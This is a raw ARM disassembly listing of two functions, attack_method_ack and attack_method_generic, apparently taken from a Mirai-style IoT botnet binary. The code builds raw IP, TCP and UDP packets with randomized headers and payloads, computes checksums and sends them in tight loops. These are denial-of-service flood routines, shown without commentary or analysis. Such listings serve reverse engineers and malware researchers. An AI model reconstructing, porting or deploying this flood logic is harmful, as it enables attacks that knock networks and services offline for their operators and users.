    c4a0:	e58d3060 	str	r3, [sp, #96]	; 0x60
    c4a4:	0a00011a 	beq	c914 <attack_method_ack+0x6d8>
    c4a8:	e59dc068 	ldr	ip, [sp, #104]	; 0x68
    c4ac:	e1a0c80c 	lsl	ip, ip, #16
    c4b0:	e28ce70a 	add	lr, ip, #2621440	; 0x280000
    c4b4:	e58dc01c 	str	ip, [sp, #28]
    c4b8:	e59dc05c 	ldr	ip, [sp, #92]	; 0x5c
    c4bc:	e59d0028 	ldr	r0, [sp, #40]	; 0x28
    c4c0:	e1a02c01 	lsl	r2, r1, #24
    c4c4:	e1a01c0c 	lsl	r1, ip, #24
    c4c8:	e59dc060 	ldr	ip, [sp, #96]	; 0x60
    c4cc:	e1a04800 	lsl	r4, r0, #16
    c4d0:	e1a00c0c 	lsl	r0, ip, #24
    c4d4:	e1a01821 	lsr	r1, r1, #16
    c4d8:	e1a00820 	lsr	r0, r0, #16
    c4dc:	e1816c26 	orr	r6, r1, r6, lsr #24
    c4e0:	e180ac2a 	orr	sl, r0, sl, lsr #24
    c4e4:	e28d0030 	add	r0, sp, #48	; 0x30
    c4e8:	e8900003 	ldm	r0, {r0, r1}
    c4ec:	e1a0c404 	lsl	ip, r4, #8
    c4f0:	e1a0340e 	lsl	r3, lr, #8
    c4f4:	e1a03823 	lsr	r3, r3, #16
    c4f8:	e1a02822 	lsr	r2, r2, #16
    c4fc:	e1a0c82c 	lsr	ip, ip, #16
    c500:	e2000001 	and	r0, r0, #1
    c504:	e2011001 	and	r1, r1, #1
    c508:	e18c4c24 	orr	r4, ip, r4, lsr #24
    c50c:	e1839c2e 	orr	r9, r3, lr, lsr #24
    c510:	e182bc25 	orr	fp, r2, r5, lsr #24
    c514:	e58d0020 	str	r0, [sp, #32]
    c518:	e58d1008 	str	r1, [sp, #8]
    c51c:	e28d2038 	add	r2, sp, #56	; 0x38
    c520:	e892100c 	ldm	r2, {r2, r3, ip}
    c524:	e59d0044 	ldr	r0, [sp, #68]	; 0x44
    c528:	e59d1038 	ldr	r1, [sp, #56]	; 0x38
    c52c:	e2022001 	and	r2, r2, #1
    c530:	e2033001 	and	r3, r3, #1
    c534:	e20cc001 	and	ip, ip, #1
    c538:	e2000001 	and	r0, r0, #1
    c53c:	e20110ff 	and	r1, r1, #255	; 0xff
    c540:	e58d200c 	str	r2, [sp, #12]
    c544:	e58d3010 	str	r3, [sp, #16]
    c548:	e58dc014 	str	ip, [sp, #20]
    c54c:	e58d0018 	str	r0, [sp, #24]
    c550:	e58d1064 	str	r1, [sp, #100]	; 0x64
    c554:	e58d4074 	str	r4, [sp, #116]	; 0x74
    c558:	e3a04000 	mov	r4, #0
    c55c:	e3a00e5e 	mov	r0, #1504	; 0x5e0
    c560:	e3a01001 	mov	r1, #1
    c564:	e2800006 	add	r0, r0, #6
    c568:	eb002d9b 	bl	17bdc <calloc>
    c56c:	e59d2024 	ldr	r2, [sp, #36]	; 0x24
    c570:	e7820104 	str	r0, [r2, r4, lsl #2]
    c574:	e59d207c 	ldr	r2, [sp, #124]	; 0x7c
    c578:	e1a03282 	lsl	r3, r2, #5
    c57c:	e0433182 	sub	r3, r3, r2, lsl #3
    c580:	e0831008 	add	r1, r3, r8
    c584:	e59d3024 	ldr	r3, [sp, #36]	; 0x24
    c588:	e7935102 	ldr	r5, [r3, r2, lsl #2]
    c58c:	e5d53000 	ldrb	r3, [r5]
    c590:	e3c330b0 	bic	r3, r3, #176	; 0xb0
    c594:	e3833040 	orr	r3, r3, #64	; 0x40
    c598:	e5c53000 	strb	r3, [r5]
    c59c:	e5d52000 	ldrb	r2, [r5]
    c5a0:	e3c2200a 	bic	r2, r2, #10
    c5a4:	e3822005 	orr	r2, r2, #5
    c5a8:	e59dc058 	ldr	ip, [sp, #88]	; 0x58
    c5ac:	e5c52000 	strb	r2, [r5]
    c5b0:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    c5b4:	e35c0000 	cmp	ip, #0
    c5b8:	e5c50001 	strb	r0, [r5, #1]
    c5bc:	e59d2054 	ldr	r2, [sp, #84]	; 0x54
    c5c0:	13a03040 	movne	r3, #64	; 0x40
    c5c4:	11c530b6 	strhne	r3, [r5, #6]
    c5c8:	e3a03006 	mov	r3, #6
    c5cc:	e5c52008 	strb	r2, [r5, #8]
    c5d0:	e5c53009 	strb	r3, [r5, #9]
    c5d4:	e59dc070 	ldr	ip, [sp, #112]	; 0x70
    c5d8:	e585c00c 	str	ip, [r5, #12]
    c5dc:	e5913010 	ldr	r3, [r1, #16]
    c5e0:	e1c590b2 	strh	r9, [r5, #2]
    c5e4:	e1c5b0b4 	strh	fp, [r5, #4]
    c5e8:	e5853010 	str	r3, [r5, #16]
    c5ec:	e1c561b4 	strh	r6, [r5, #20]
    c5f0:	e2854014 	add	r4, r5, #20
    c5f4:	e5d4300c 	ldrb	r3, [r4, #12]
    c5f8:	e5d4200d 	ldrb	r2, [r4, #13]
    c5fc:	e59d0020 	ldr	r0, [sp, #32]
    c600:	e3c330a0 	bic	r3, r3, #160	; 0xa0
    c604:	e3833050 	orr	r3, r3, #80	; 0x50
    c608:	e3c22020 	bic	r2, r2, #32
    c60c:	e5c4300c 	strb	r3, [r4, #12]
    c610:	e1822280 	orr	r2, r2, r0, lsl #5
    c614:	e59d1074 	ldr	r1, [sp, #116]	; 0x74
    c618:	e5c4200d 	strb	r2, [r4, #13]
    c61c:	e5d4300d 	ldrb	r3, [r4, #13]
    c620:	e59d2008 	ldr	r2, [sp, #8]
    c624:	e3c33010 	bic	r3, r3, #16
    c628:	e1833202 	orr	r3, r3, r2, lsl #4
    c62c:	e5841004 	str	r1, [r4, #4]
    c630:	e1c4a0b2 	strh	sl, [r4, #2]
    c634:	e5c4300d 	strb	r3, [r4, #13]
    c638:	e5d4200d 	ldrb	r2, [r4, #13]
    c63c:	e59d300c 	ldr	r3, [sp, #12]
    c640:	e3c22008 	bic	r2, r2, #8
    c644:	e1822183 	orr	r2, r2, r3, lsl #3
    c648:	e5c4200d 	strb	r2, [r4, #13]
    c64c:	e5d4300d 	ldrb	r3, [r4, #13]
    c650:	e59dc010 	ldr	ip, [sp, #16]
    c654:	e3c33004 	bic	r3, r3, #4
    c658:	e183310c 	orr	r3, r3, ip, lsl #2
    c65c:	e5c4300d 	strb	r3, [r4, #13]
    c660:	e5d4200d 	ldrb	r2, [r4, #13]
    c664:	e59d0014 	ldr	r0, [sp, #20]
    c668:	e3c22002 	bic	r2, r2, #2
    c66c:	e1822080 	orr	r2, r2, r0, lsl #1
    c670:	e5c4200d 	strb	r2, [r4, #13]
    c674:	e5d4300d 	ldrb	r3, [r4, #13]
    c678:	e59d1018 	ldr	r1, [sp, #24]
    c67c:	e3c33001 	bic	r3, r3, #1
    c680:	e1813003 	orr	r3, r1, r3
    c684:	e5c4300d 	strb	r3, [r4, #13]
    c688:	eb0017da 	bl	125f8 <rand_next>
    c68c:	e59d2064 	ldr	r2, [sp, #100]	; 0x64
    c690:	e3520000 	cmp	r2, #0
    c694:	15d4300d 	ldrbne	r3, [r4, #13]
    c698:	13833008 	orrne	r3, r3, #8
    c69c:	e1c400be 	strh	r0, [r4, #14]
    c6a0:	e59d1068 	ldr	r1, [sp, #104]	; 0x68
    c6a4:	e2850028 	add	r0, r5, #40	; 0x28
    c6a8:	15c4300d 	strbne	r3, [r4, #13]
    c6ac:	eb001836 	bl	1278c <rand_str>
    c6b0:	e59d307c 	ldr	r3, [sp, #124]	; 0x7c
    c6b4:	e2834001 	add	r4, r3, #1
    c6b8:	e1540007 	cmp	r4, r7
    c6bc:	e58d407c 	str	r4, [sp, #124]	; 0x7c
    c6c0:	baffffa5 	blt	c55c <attack_method_ack+0x320>
    c6c4:	e59d3068 	ldr	r3, [sp, #104]	; 0x68
    c6c8:	e2839014 	add	r9, r3, #20
    c6cc:	e283b028 	add	fp, r3, #40	; 0x28
    c6d0:	e59d101c 	ldr	r1, [sp, #28]
    c6d4:	e2812705 	add	r2, r1, #1310720	; 0x140000
    c6d8:	e1a03402 	lsl	r3, r2, #8
    c6dc:	e1a03823 	lsr	r3, r3, #16
    c6e0:	e183ac22 	orr	sl, r3, r2, lsr #24
    c6e4:	e3a03000 	mov	r3, #0
    c6e8:	e3570000 	cmp	r7, #0
    c6ec:	e58d307c 	str	r3, [sp, #124]	; 0x7c
    c6f0:	0afffffb 	beq	c6e4 <attack_method_ack+0x4a8>
    c6f4:	e1a00003 	mov	r0, r3
    c6f8:	e1a03280 	lsl	r3, r0, #5
    c6fc:	e0433180 	sub	r3, r3, r0, lsl #3
    c700:	e0833008 	add	r3, r3, r8
    c704:	e59dc024 	ldr	ip, [sp, #36]	; 0x24
    c708:	e5d32014 	ldrb	r2, [r3, #20]
    c70c:	e79c5100 	ldr	r5, [ip, r0, lsl #2]
    c710:	e352001f 	cmp	r2, #31
    c714:	e2856014 	add	r6, r5, #20
    c718:	9a00003c 	bls	c810 <attack_method_ack+0x5d4>
    c71c:	e59d0070 	ldr	r0, [sp, #112]	; 0x70
    c720:	e3700001 	cmn	r0, #1
    c724:	0a000051 	beq	c870 <attack_method_ack+0x634>
    c728:	e3a04801 	mov	r4, #65536	; 0x10000
    c72c:	e59d1050 	ldr	r1, [sp, #80]	; 0x50
    c730:	e2444001 	sub	r4, r4, #1
    c734:	e1510004 	cmp	r1, r4
    c738:	0a000053 	beq	c88c <attack_method_ack+0x650>
    c73c:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    c740:	e1520004 	cmp	r2, r4
    c744:	0a000055 	beq	c8a0 <attack_method_ack+0x664>
    c748:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    c74c:	e1530004 	cmp	r3, r4
    c750:	0a000057 	beq	c8b4 <attack_method_ack+0x678>
    c754:	e59dc028 	ldr	ip, [sp, #40]	; 0x28
    c758:	e15c0004 	cmp	ip, r4
    c75c:	0a000059 	beq	c8c8 <attack_method_ack+0x68c>
    c760:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    c764:	e1500004 	cmp	r0, r4
    c768:	0a00005b 	beq	c8dc <attack_method_ack+0x6a0>
    c76c:	e59d106c 	ldr	r1, [sp, #108]	; 0x6c
    c770:	e3510000 	cmp	r1, #0
    c774:	1a00005d 	bne	c8f0 <attack_method_ack+0x6b4>
    c778:	e3a02000 	mov	r2, #0
    c77c:	e1c520ba 	strh	r2, [r5, #10]
    c780:	e3a01014 	mov	r1, #20
    c784:	e1a00005 	mov	r0, r5
    c788:	eb000838 	bl	e870 <checksum_generic>
    c78c:	e3a03000 	mov	r3, #0
    c790:	e1c500ba 	strh	r0, [r5, #10]
    c794:	e1a01006 	mov	r1, r6
    c798:	e1c631b0 	strh	r3, [r6, #16]
    c79c:	e1a0200a 	mov	r2, sl
    c7a0:	e1a03009 	mov	r3, r9
    c7a4:	e1a00005 	mov	r0, r5
    c7a8:	eb000844 	bl	e8c0 <checksum_tcpudp>
    c7ac:	e59d307c 	ldr	r3, [sp, #124]	; 0x7c
    c7b0:	e1a0e283 	lsl	lr, r3, #5
    c7b4:	e1c601b0 	strh	r0, [r6, #16]
    c7b8:	e04ee183 	sub	lr, lr, r3, lsl #3
    c7bc:	e1d660b2 	ldrh	r6, [r6, #2]
    c7c0:	e08ee008 	add	lr, lr, r8
    c7c4:	e1ce60b2 	strh	r6, [lr, #2]
    c7c8:	e3a03901 	mov	r3, #16384	; 0x4000
    c7cc:	e3a0c010 	mov	ip, #16
    c7d0:	e1a01005 	mov	r1, r5
    c7d4:	e59d0048 	ldr	r0, [sp, #72]	; 0x48
    c7d8:	e1a0200b 	mov	r2, fp
    c7dc:	e58de000 	str	lr, [sp]
    c7e0:	e58dc004 	str	ip, [sp, #4]
    c7e4:	eb0029e6 	bl	16f84 <__libc_sendto>
    c7e8:	e59d307c 	ldr	r3, [sp, #124]	; 0x7c
    c7ec:	e2830001 	add	r0, r3, #1
    c7f0:	e1500007 	cmp	r0, r7
    c7f4:	e58d007c 	str	r0, [sp, #124]	; 0x7c
    c7f8:	baffffbe 	blt	c6f8 <attack_method_ack+0x4bc>
    c7fc:	e3a03000 	mov	r3, #0
    c800:	e3570000 	cmp	r7, #0
    c804:	e58d307c 	str	r3, [sp, #124]	; 0x7c
    c808:	0affffb5 	beq	c6e4 <attack_method_ack+0x4a8>
    c80c:	eaffffb8 	b	c6f4 <attack_method_ack+0x4b8>
    c810:	e5934010 	ldr	r4, [r3, #16]
    c814:	eb001777 	bl	125f8 <rand_next>
    c818:	e59d307c 	ldr	r3, [sp, #124]	; 0x7c
    c81c:	e1a01283 	lsl	r1, r3, #5
    c820:	e0411183 	sub	r1, r1, r3, lsl #3
    c824:	e204c8ff 	and	ip, r4, #16711680	; 0xff0000
    c828:	e1a02c24 	lsr	r2, r4, #24
    c82c:	e182242c 	orr	r2, r2, ip, lsr #8
    c830:	e0811008 	add	r1, r1, r8
    c834:	e2043cff 	and	r3, r4, #65280	; 0xff00
    c838:	e5d1c014 	ldrb	ip, [r1, #20]
    c83c:	e1822403 	orr	r2, r2, r3, lsl #8
    c840:	e1822c04 	orr	r2, r2, r4, lsl #24
    c844:	e0822c30 	add	r2, r2, r0, lsr ip
    c848:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    c84c:	e1a03c22 	lsr	r3, r2, #24
    c850:	e1833420 	orr	r3, r3, r0, lsr #8
    c854:	e2021cff 	and	r1, r2, #65280	; 0xff00
    c858:	e59d0070 	ldr	r0, [sp, #112]	; 0x70
    c85c:	e1833401 	orr	r3, r3, r1, lsl #8
    c860:	e1833c02 	orr	r3, r3, r2, lsl #24
    c864:	e3700001 	cmn	r0, #1
    c868:	e5853010 	str	r3, [r5, #16]
    c86c:	1affffad 	bne	c728 <attack_method_ack+0x4ec>
    c870:	eb001760 	bl	125f8 <rand_next>
    c874:	e3a04801 	mov	r4, #65536	; 0x10000
    c878:	e59d1050 	ldr	r1, [sp, #80]	; 0x50
    c87c:	e2444001 	sub	r4, r4, #1
    c880:	e1510004 	cmp	r1, r4
    c884:	e585000c 	str	r0, [r5, #12]
    c888:	1affffab 	bne	c73c <attack_method_ack+0x500>
    c88c:	eb001759 	bl	125f8 <rand_next>
    c890:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    c894:	e1520004 	cmp	r2, r4
    c898:	e1c500b4 	strh	r0, [r5, #4]
    c89c:	1affffa9 	bne	c748 <attack_method_ack+0x50c>
    c8a0:	eb001754 	bl	125f8 <rand_next>
    c8a4:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    c8a8:	e1530004 	cmp	r3, r4
    c8ac:	e1c501b4 	strh	r0, [r5, #20]
    c8b0:	1affffa7 	bne	c754 <attack_method_ack+0x518>
    c8b4:	eb00174f 	bl	125f8 <rand_next>
    c8b8:	e59dc028 	ldr	ip, [sp, #40]	; 0x28
    c8bc:	e15c0004 	cmp	ip, r4
    c8c0:	e1c600b2 	strh	r0, [r6, #2]
    c8c4:	1affffa5 	bne	c760 <attack_method_ack+0x524>
    c8c8:	eb00174a 	bl	125f8 <rand_next>
    c8cc:	e5860004 	str	r0, [r6, #4]
    c8d0:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    c8d4:	e1500004 	cmp	r0, r4
    c8d8:	1affffa3 	bne	c76c <attack_method_ack+0x530>
    c8dc:	eb001745 	bl	125f8 <rand_next>
    c8e0:	e59d106c 	ldr	r1, [sp, #108]	; 0x6c
    c8e4:	e3510000 	cmp	r1, #0
    c8e8:	e5860008 	str	r0, [r6, #8]
    c8ec:	0affffa1 	beq	c778 <attack_method_ack+0x53c>
    c8f0:	e2850028 	add	r0, r5, #40	; 0x28
    c8f4:	e59d1068 	ldr	r1, [sp, #104]	; 0x68
    c8f8:	eb0017a3 	bl	1278c <rand_str>
    c8fc:	eaffff9d 	b	c778 <attack_method_ack+0x53c>
    c900:	e59d0048 	ldr	r0, [sp, #72]	; 0x48
    c904:	eb00354d 	bl	19e40 <__GI___libc_close>
    c908:	e28dd084 	add	sp, sp, #132	; 0x84
    c90c:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    c910:	e12fff1e 	bx	lr
    c914:	e59d0068 	ldr	r0, [sp, #104]	; 0x68
    c918:	e59dc068 	ldr	ip, [sp, #104]	; 0x68
    c91c:	e2809014 	add	r9, r0, #20
    c920:	e1a0c80c 	lsl	ip, ip, #16
    c924:	e280b028 	add	fp, r0, #40	; 0x28
    c928:	e58dc01c 	str	ip, [sp, #28]
    c92c:	eaffff67 	b	c6d0 <attack_method_ack+0x494>
    c930:	0002b8ac 	.word	0x0002b8ac

0000c934 <attack_method_generic>:
    c934:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    c938:	e1a08001 	mov	r8, r1
    c93c:	e24dd054 	sub	sp, sp, #84	; 0x54
    c940:	e3a01004 	mov	r1, #4
    c944:	e1a04002 	mov	r4, r2
    c948:	e1a05003 	mov	r5, r3
    c94c:	e1a07000 	mov	r7, r0
    c950:	eb002ca1 	bl	17bdc <calloc>
    c954:	e1a01005 	mov	r1, r5
    c958:	e58d0010 	str	r0, [sp, #16]
    c95c:	e3a02002 	mov	r2, #2
    c960:	e3a03000 	mov	r3, #0
    c964:	e1a00004 	mov	r0, r4
    c968:	ebfff674 	bl	a340 <attack_get_opt_int>
    c96c:	e3a03801 	mov	r3, #65536	; 0x10000
    c970:	e1a0c000 	mov	ip, r0
    c974:	e20cc0ff 	and	ip, ip, #255	; 0xff
    c978:	e2433001 	sub	r3, r3, #1
    c97c:	e3a02003 	mov	r2, #3
    c980:	e1a01005 	mov	r1, r5
    c984:	e1a00004 	mov	r0, r4
    c988:	e58dc01c 	str	ip, [sp, #28]
    c98c:	ebfff66b 	bl	a340 <attack_get_opt_int>
    c990:	e1a01005 	mov	r1, r5
    c994:	e58d0014 	str	r0, [sp, #20]
    c998:	e3a02004 	mov	r2, #4
    c99c:	e3a03040 	mov	r3, #64	; 0x40
    c9a0:	e1a00004 	mov	r0, r4
    c9a4:	ebfff665 	bl	a340 <attack_get_opt_int>
    c9a8:	e1a0c000 	mov	ip, r0
    c9ac:	e20cc0ff 	and	ip, ip, #255	; 0xff
    c9b0:	e1a01005 	mov	r1, r5
    c9b4:	e3a02005 	mov	r2, #5
    c9b8:	e3a03000 	mov	r3, #0
    c9bc:	e1a00004 	mov	r0, r4
    c9c0:	e58dc024 	str	ip, [sp, #36]	; 0x24
    c9c4:	ebfff65d 	bl	a340 <attack_get_opt_int>
    c9c8:	e3a03801 	mov	r3, #65536	; 0x10000
    c9cc:	e1a0c000 	mov	ip, r0
    c9d0:	e20cc0ff 	and	ip, ip, #255	; 0xff
    c9d4:	e2433001 	sub	r3, r3, #1
    c9d8:	e3a02006 	mov	r2, #6
    c9dc:	e1a01005 	mov	r1, r5
    c9e0:	e1a00004 	mov	r0, r4
    c9e4:	e58dc028 	str	ip, [sp, #40]	; 0x28
    c9e8:	ebfff654 	bl	a340 <attack_get_opt_int>
    c9ec:	e3a03801 	mov	r3, #65536	; 0x10000
    c9f0:	e1a01005 	mov	r1, r5
    c9f4:	e2433001 	sub	r3, r3, #1
    c9f8:	e3a02007 	mov	r2, #7
    c9fc:	e1a09000 	mov	r9, r0
    ca00:	e1a00004 	mov	r0, r4
    ca04:	ebfff64d 	bl	a340 <attack_get_opt_int>
    ca08:	e1a01005 	mov	r1, r5
    ca0c:	e3a02000 	mov	r2, #0
    ca10:	e3a03c02 	mov	r3, #512	; 0x200
    ca14:	e1a0a000 	mov	sl, r0
    ca18:	e1a00004 	mov	r0, r4
    ca1c:	ebfff647 	bl	a340 <attack_get_opt_int>
    ca20:	e3a02001 	mov	r2, #1
    ca24:	e1a03002 	mov	r3, r2
    ca28:	e1a01005 	mov	r1, r5
    ca2c:	e1a06000 	mov	r6, r0
    ca30:	e1a00004 	mov	r0, r4
    ca34:	ebfff641 	bl	a340 <attack_get_opt_int>
    ca38:	e59f23dc 	ldr	r2, [pc, #988]	; ce1c <attack_method_generic+0x4e8>
    ca3c:	e1a0c000 	mov	ip, r0
    ca40:	e5923000 	ldr	r3, [r2]
    ca44:	e20cc0ff 	and	ip, ip, #255	; 0xff
    ca48:	e1a01005 	mov	r1, r5
    ca4c:	e3a02019 	mov	r2, #25
    ca50:	e1a00004 	mov	r0, r4
    ca54:	e58dc034 	str	ip, [sp, #52]	; 0x34
    ca58:	ebfff638 	bl	a340 <attack_get_opt_int>
    ca5c:	e3a01003 	mov	r1, #3
    ca60:	e58d0018 	str	r0, [sp, #24]
    ca64:	e3a02011 	mov	r2, #17
    ca68:	e3a00002 	mov	r0, #2
    ca6c:	eb002978 	bl	17054 <__GI_socket>
    ca70:	e3700001 	cmn	r0, #1
    ca74:	e1a0b000 	mov	fp, r0
    ca78:	0a0000e4 	beq	ce10 <attack_method_generic+0x4dc>
    ca7c:	e28d3050 	add	r3, sp, #80	; 0x50
    ca80:	e3a02001 	mov	r2, #1
    ca84:	e5232004 	str	r2, [r3, #-4]!
    ca88:	e3a0c004 	mov	ip, #4
    ca8c:	e3a01000 	mov	r1, #0
    ca90:	e2822002 	add	r2, r2, #2
    ca94:	e58dc000 	str	ip, [sp]
    ca98:	eb00295b 	bl	1700c <__GI_setsockopt>
    ca9c:	e3700001 	cmn	r0, #1
    caa0:	0a0000d8 	beq	ce08 <attack_method_generic+0x4d4>
    caa4:	e1a02806 	lsl	r2, r6, #16
    caa8:	e3a03e5b 	mov	r3, #1456	; 0x5b0
    caac:	e2833004 	add	r3, r3, #4
    cab0:	e1a02822 	lsr	r2, r2, #16
    cab4:	e1520003 	cmp	r2, r3
    cab8:	21a02003 	movcs	r2, r3
    cabc:	e59d0014 	ldr	r0, [sp, #20]
    cac0:	e1a06809 	lsl	r6, r9, #16
    cac4:	e58d2044 	str	r2, [sp, #68]	; 0x44
    cac8:	e1a0c826 	lsr	ip, r6, #16
    cacc:	e3570000 	cmp	r7, #0
    cad0:	e1a0a80a 	lsl	sl, sl, #16
    cad4:	e1a05800 	lsl	r5, r0, #16
    cad8:	e58dc02c 	str	ip, [sp, #44]	; 0x2c
    cadc:	059dc044 	ldreq	ip, [sp, #68]	; 0x44
    cae0:	e1a0082a 	lsr	r0, sl, #16
    cae4:	e3a01000 	mov	r1, #0
    cae8:	e1a03825 	lsr	r3, r5, #16
    caec:	e58da00c 	str	sl, [sp, #12]
    caf0:	e58d104c 	str	r1, [sp, #76]	; 0x4c
    caf4:	e58d3020 	str	r3, [sp, #32]
    caf8:	e58d0030 	str	r0, [sp, #48]	; 0x30
    cafc:	028c901c 	addeq	r9, ip, #28
    cb00:	028ca008 	addeq	sl, ip, #8
    cb04:	0a000048 	beq	cc2c <attack_method_generic+0x2f8>
    cb08:	e59dc020 	ldr	ip, [sp, #32]
    cb0c:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    cb10:	e282901c 	add	r9, r2, #28
    cb14:	e282a008 	add	sl, r2, #8
    cb18:	e1a01c00 	lsl	r1, r0, #24
    cb1c:	e1a02c0c 	lsl	r2, ip, #24
    cb20:	e59dc030 	ldr	ip, [sp, #48]	; 0x30
    cb24:	e1a0e809 	lsl	lr, r9, #16
    cb28:	e1a01821 	lsr	r1, r1, #16
    cb2c:	e1a0480a 	lsl	r4, sl, #16
    cb30:	e1a0340e 	lsl	r3, lr, #8
    cb34:	e1a00c0c 	lsl	r0, ip, #24
    cb38:	e1816c26 	orr	r6, r1, r6, lsr #24
    cb3c:	e59d100c 	ldr	r1, [sp, #12]
    cb40:	e1a0c404 	lsl	ip, r4, #8
    cb44:	e1a03823 	lsr	r3, r3, #16
    cb48:	e1a00820 	lsr	r0, r0, #16
    cb4c:	e1a0c82c 	lsr	ip, ip, #16
    cb50:	e183ec2e 	orr	lr, r3, lr, lsr #24
    cb54:	e1800c21 	orr	r0, r0, r1, lsr #24
    cb58:	e18c4c24 	orr	r4, ip, r4, lsr #24
    cb5c:	e1a02822 	lsr	r2, r2, #16
    cb60:	e58de040 	str	lr, [sp, #64]	; 0x40
    cb64:	e58d003c 	str	r0, [sp, #60]	; 0x3c
    cb68:	e58d4038 	str	r4, [sp, #56]	; 0x38
    cb6c:	e1825c25 	orr	r5, r2, r5, lsr #24
    cb70:	e3a04000 	mov	r4, #0
    cb74:	e3a00e5e 	mov	r0, #1504	; 0x5e0
    cb78:	e3a01001 	mov	r1, #1
    cb7c:	e2800006 	add	r0, r0, #6
    cb80:	eb002c15 	bl	17bdc <calloc>
    cb84:	e59d3010 	ldr	r3, [sp, #16]
    cb88:	e59d104c 	ldr	r1, [sp, #76]	; 0x4c
    cb8c:	e7830104 	str	r0, [r3, r4, lsl #2]
    cb90:	e7930101 	ldr	r0, [r3, r1, lsl #2]
    cb94:	e5d03000 	ldrb	r3, [r0]
    cb98:	e3c330b0 	bic	r3, r3, #176	; 0xb0
    cb9c:	e3833040 	orr	r3, r3, #64	; 0x40
    cba0:	e5c03000 	strb	r3, [r0]
    cba4:	e5d03000 	ldrb	r3, [r0]
    cba8:	e3c3300a 	bic	r3, r3, #10
    cbac:	e3833005 	orr	r3, r3, #5
    cbb0:	e59dc028 	ldr	ip, [sp, #40]	; 0x28
    cbb4:	e1a02281 	lsl	r2, r1, #5
    cbb8:	e5c03000 	strb	r3, [r0]
    cbbc:	e2814001 	add	r4, r1, #1
    cbc0:	e0422181 	sub	r2, r2, r1, lsl #3
    cbc4:	e59d101c 	ldr	r1, [sp, #28]
    cbc8:	e5c01001 	strb	r1, [r0, #1]
    cbcc:	e59d3024 	ldr	r3, [sp, #36]	; 0x24
    cbd0:	e35c0000 	cmp	ip, #0
    cbd4:	e5c03008 	strb	r3, [r0, #8]
    cbd8:	13a03040 	movne	r3, #64	; 0x40
    cbdc:	11c030b6 	strhne	r3, [r0, #6]
    cbe0:	e59dc040 	ldr	ip, [sp, #64]	; 0x40
    cbe4:	e3a03011 	mov	r3, #17
    cbe8:	e5c03009 	strb	r3, [r0, #9]
    cbec:	e1c0c0b2 	strh	ip, [r0, #2]
    cbf0:	e59dc018 	ldr	ip, [sp, #24]
    cbf4:	e580c00c 	str	ip, [r0, #12]
    cbf8:	e0822008 	add	r2, r2, r8
    cbfc:	e5923010 	ldr	r3, [r2, #16]
    cc00:	e1c050b4 	strh	r5, [r0, #4]
    cc04:	e2801014 	add	r1, r0, #20
    cc08:	e5803010 	str	r3, [r0, #16]
    cc0c:	e1c061b4 	strh	r6, [r0, #20]
    cc10:	e28d0038 	add	r0, sp, #56	; 0x38
    cc14:	e8900009 	ldm	r0, {r0, r3}
    cc18:	e1540007 	cmp	r4, r7
    cc1c:	e1c100b4 	strh	r0, [r1, #4]
    cc20:	e1c130b2 	strh	r3, [r1, #2]
    cc24:	e58d404c 	str	r4, [sp, #76]	; 0x4c
    cc28:	baffffd1 	blt	cb74 <attack_method_generic+0x240>
    cc2c:	e3a03000 	mov	r3, #0
    cc30:	e3570000 	cmp	r7, #0
    cc34:	e58d304c 	str	r3, [sp, #76]	; 0x4c
    cc38:	0afffffb 	beq	cc2c <attack_method_generic+0x2f8>
    cc3c:	e1a00003 	mov	r0, r3
    cc40:	e1a03280 	lsl	r3, r0, #5
    cc44:	e0433180 	sub	r3, r3, r0, lsl #3
    cc48:	e0833008 	add	r3, r3, r8
    cc4c:	e59d1010 	ldr	r1, [sp, #16]
    cc50:	e5d32014 	ldrb	r2, [r3, #20]
    cc54:	e7915100 	ldr	r5, [r1, r0, lsl #2]
    cc58:	e352001f 	cmp	r2, #31
    cc5c:	e2856014 	add	r6, r5, #20
    cc60:	9a000036 	bls	cd40 <attack_method_generic+0x40c>
    cc64:	e59d3018 	ldr	r3, [sp, #24]
    cc68:	e3730001 	cmn	r3, #1
    cc6c:	0a00004b 	beq	cda0 <attack_method_generic+0x46c>
    cc70:	e3a04801 	mov	r4, #65536	; 0x10000
    cc74:	e59dc020 	ldr	ip, [sp, #32]
    cc78:	e2444001 	sub	r4, r4, #1
    cc7c:	e15c0004 	cmp	ip, r4
    cc80:	0a00004d 	beq	cdbc <attack_method_generic+0x488>
    cc84:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    cc88:	e1500004 	cmp	r0, r4
    cc8c:	0a00004f 	beq	cdd0 <attack_method_generic+0x49c>
    cc90:	e59d1030 	ldr	r1, [sp, #48]	; 0x30
    cc94:	e1510004 	cmp	r1, r4
    cc98:	0a000051 	beq	cde4 <attack_method_generic+0x4b0>
    cc9c:	e59d3034 	ldr	r3, [sp, #52]	; 0x34
    cca0:	e3530000 	cmp	r3, #0
    cca4:	1a000053 	bne	cdf8 <attack_method_generic+0x4c4>
    cca8:	e3a0c000 	mov	ip, #0
    ccac:	e1c5c0ba 	strh	ip, [r5, #10]
    ccb0:	e3a01014 	mov	r1, #20
    ccb4:	e1a00005 	mov	r0, r5
    ccb8:	eb0006ec 	bl	e870 <checksum_generic>
    ccbc:	e1c500ba 	strh	r0, [r5, #10]
    ccc0:	e3a00000 	mov	r0, #0
    ccc4:	e1c600b6 	strh	r0, [r6, #6]
    ccc8:	e1a01006 	mov	r1, r6
    cccc:	e1d620b4 	ldrh	r2, [r6, #4]
    ccd0:	e1a0300a 	mov	r3, sl
    ccd4:	e1a00005 	mov	r0, r5
    ccd8:	eb0006f8 	bl	e8c0 <checksum_tcpudp>
    ccdc:	e59d304c 	ldr	r3, [sp, #76]	; 0x4c
    cce0:	e1a0e283 	lsl	lr, r3, #5
    cce4:	e1c600b6 	strh	r0, [r6, #6]
    cce8:	e04ee183 	sub	lr, lr, r3, lsl #3
    ccec:	e1d660b2 	ldrh	r6, [r6, #2]
    ccf0:	e08ee008 	add	lr, lr, r8
    ccf4:	e1ce60b2 	strh	r6, [lr, #2]
